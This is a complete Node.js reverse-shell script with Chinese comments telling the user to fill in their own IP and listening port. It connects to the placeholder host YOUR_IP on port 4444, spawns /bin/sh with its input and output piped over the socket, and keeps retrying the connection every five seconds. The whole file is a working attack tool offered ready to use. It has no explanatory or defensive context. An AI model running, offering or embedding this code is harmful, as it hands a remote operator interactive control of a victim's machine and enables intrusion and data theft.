const net = require("net");
const { spawn } = require("child_process");

const HOST = "YOUR_IP"; // 改成你的 IP
const PORT = 4444;       // 改成你的監聽端口

function connect() {
  const client = new net.Socket();
  client.connect(PORT, HOST, () => {
    const sh = spawn("/bin/sh", [], { stdio: ["pipe", "pipe", "pipe"] });
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
    sh.on("close", () => client.destroy());
  });
  client.on("error", () => setTimeout(connect, 5000));
  client.on("close", () => setTimeout(connect, 5000));
}

connect();
